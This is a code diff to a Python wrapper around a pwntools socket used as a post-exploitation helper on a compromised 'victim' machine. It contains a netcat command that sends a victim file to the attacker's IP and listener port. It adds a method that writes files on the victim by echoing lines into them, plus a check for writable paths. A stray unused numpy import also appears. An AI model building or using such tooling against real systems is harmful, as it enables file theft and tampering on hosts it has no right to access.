@@ -1,5 +1,6 @@
 import hashlib
 import uuid
+from numpy.ma.core import append
 import pwn
 from pwnlib.tubes.sock import sock
 import utilities
@@ -54,11 +55,16 @@ class PwnlibSocketWrapper:
         thread = utilities.ThreadWithReturnValue(target=self.listen_for_netcat_file_upload_from_victim)
         thread.start()
 
-        download_command = f'nc -w 5 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
-        self.client.sendline(download_command)
+        upload_command = f'nc -w 5 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
+        self.client.sendline(upload_command)
 
         downloaded_output = thread.join()
         return downloaded_output.decode(self.encoding)
+    
+    def write_remote_file(self, remote_path: str, content: str):
+        for line in content.split('\n'):
+            append_line_command = f'echo \'{line}\' >> {remote_path}'.encode()
+            self.client.sendline(append_line_command)
 
     def listen_for_netcat_file_upload_from_victim(self) -> bytes:
         downloaded_output = None
@@ -85,4 +91,9 @@ class PwnlibSocketWrapper:
     def remote_file_readable(self, remote_path: str) -> bool:
         file_readable_command = f'find {remote_path} -readable'.encode()
         output = self.send_command_read_output(file_readable_command, expect_single_line_output=True)
+        return not not output
+
+    def remote_file_writable(self, remote_path: str) -> bool:
+        file_writeable_command = f'find {remote_path} -writable'.encode()
+        output = self.send_command_read_output(file_writeable_command, expect_single_line_output=True)
         return not not output
